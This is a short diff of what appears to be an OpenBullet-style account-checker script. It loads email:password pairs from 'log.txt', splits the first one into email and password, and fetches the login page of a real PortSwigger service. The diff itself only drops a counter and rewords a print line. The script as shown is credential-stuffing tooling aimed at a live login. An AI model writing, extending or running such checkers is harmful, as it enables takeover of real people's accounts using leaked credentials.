@@ -4,19 +4,13 @@
 FileReadLines "log.txt" -> VAR "accounts"
 PRINT "Loaded accounts" White
 
-GetListLength $"<accounts>" -> VAR "total"
-PRINT "Total accounts:" White
-
-## Test with first account
-SET VAR "counter" "0" Integer
-
 ## Process account [0]
 SET VAR "account" $"<accounts[0]>"
 Split $"<account>" ":" -> VAR "creds"
 SET VAR "email" $"<creds[0]>"
 SET VAR "password" $"<creds[1]>"
 
-PRINT "Testing first account" White
+PRINT "Processing first account" White
 
 ## Step 1: GET login page
 HttpRequest GET "https://login.portswigger.net/u/login" ReadResponseSource=True
